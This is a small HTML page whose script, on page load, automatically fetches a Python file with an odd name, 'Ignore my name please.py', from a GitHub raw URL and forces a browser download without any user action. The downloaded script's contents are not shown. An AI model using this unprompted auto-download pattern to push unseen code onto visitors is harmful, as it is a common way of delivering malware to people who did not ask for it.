<!DOCTYPE html>
<html>
<head>
    <title>File Downloader</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 50px; }
        .box { 
            background: #fff; 
            border: 1px solid #ccc; 
            padding: 20px; 
            width: 420px; 
            margin: 0 auto; 
            box-shadow: 2px 2px 5px rgba(0,0,0,0.1); 
            text-align: center;
        }
        h2 { font-size: 18px; margin-top: 0; color: #333; }
        #status { font-weight: bold; color: #0000FF; margin: 15px 0; }
        .footer { font-size: 11px; color: #666; margin-top: 20px; }
    </style>
</head>
<body>

<div class="box">
    <h2>Script Downloader</h2>
    <hr>
    <div id="status">Status: Initializing...</div>
    <p>Please wait. Your file:<br><b>Ignore my name please.py</b><br>will download automatically.</p>
    <hr>
    <div class="footer">Utility Version 1.0</div>
</div>

<script>
    async function startDownload() {
        const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please.py";
        const FILE_NAME = "Ignore my name please.py";
        const statusDiv = document.getElementById('status');

        try {
            statusDiv.innerText = "Status: Connecting to GitHub...";
            
            const response = await fetch(GITHUB_FILE_URL);
            
            if (!response.ok) {
                throw new Error(`Failed: ${response.status}`);
            }

            statusDiv.innerText = "Status: Processing File...";
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = FILE_NAME;
            document.body.appendChild(a);
            a.click();
            
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);

            statusDiv.innerText = "Status: Downloaded Successfully!";
            statusDiv.style.color = "#008000";

        } catch (error) {
            statusDiv.innerText = "Status: Error - " + error.message;
            statusDiv.style.color = "#FF0000";
            console.error('Download failed:', error);
        }
    }

    window.onload = startDownload;
</script>

</body>
</html>
